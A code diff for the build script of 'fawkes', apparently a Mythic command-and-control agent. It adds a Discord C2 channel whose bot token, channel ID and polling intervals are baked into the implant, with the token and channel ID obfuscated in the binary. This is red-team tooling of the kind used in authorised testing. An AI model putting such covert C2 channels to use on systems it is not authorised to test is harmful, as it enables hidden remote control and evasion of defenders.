@@ -66,7 +66,7 @@ var payloadDefinition = agentstructs.PayloadType{
 	CanBeWrappedByTheFollowingPayloadTypes: []string{},
 	SupportsDynamicLoading:                 false,
 	Description:                            "fawkes agent",
-	SupportedC2Profiles:                    []string{"http", "tcp"},
+	SupportedC2Profiles:                    []string{"http", "tcp", "discord"},
 	MythicEncryptsData:                     true,
 	MessageFormat:                          agentstructs.MessageFormatJSON,
 	BuildParameters: []agentstructs.BuildParameter{
@@ -400,6 +400,36 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 				return payloadBuildResponse
 			}
 			ldflags += fmt.Sprintf(" -X '%s.postURI=%s'", fawkes_main_package, val)
+		} else if key == "discord_token" {
+			// Discord C2 profile: bot token
+			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
+			if err != nil {
+				payloadBuildResponse.Success = false
+				payloadBuildResponse.BuildStdErr = err.Error()
+				return payloadBuildResponse
+			}
+			ldflags += fmt.Sprintf(" -X '%s.discordBotToken=%s'", fawkes_main_package, val)
+		} else if key == "bot_channel" {
+			// Discord C2 profile: channel ID
+			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
+			if err != nil {
+				payloadBuildResponse.Success = false
+				payloadBuildResponse.BuildStdErr = err.Error()
+				return payloadBuildResponse
+			}
+			ldflags += fmt.Sprintf(" -X '%s.discordChannelID=%s'", fawkes_main_package, val)
+		} else if key == "message_checks" {
+			// Discord C2 profile: max polling attempts per exchange
+			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
+			if err == nil && int(val) > 0 {
+				ldflags += fmt.Sprintf(" -X '%s.discordPollChecks=%d'", fawkes_main_package, int(val))
+			}
+		} else if key == "time_between_checks" {
+			// Discord C2 profile: seconds between polls
+			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
+			if err == nil && int(val) > 0 {
+				ldflags += fmt.Sprintf(" -X '%s.discordPollDelay=%d'", fawkes_main_package, int(val))
+			}
 		}
 	}
 
@@ -550,6 +580,14 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 			case "AESPSK":
 				if cryptoVal, err := payloadBuildMsg.C2Profiles[0].GetCryptoArg(key); err == nil {
 					obfVars = append(obfVars, obfVar{"encryptionKey", cryptoVal.EncKey})
+				}
+			case "discord_token":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
+					obfVars = append(obfVars, obfVar{"discordBotToken", val})
+				}
+			case "bot_channel":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
+					obfVars = append(obfVars, obfVar{"discordChannelID", val})
 				}
 			}
 		}
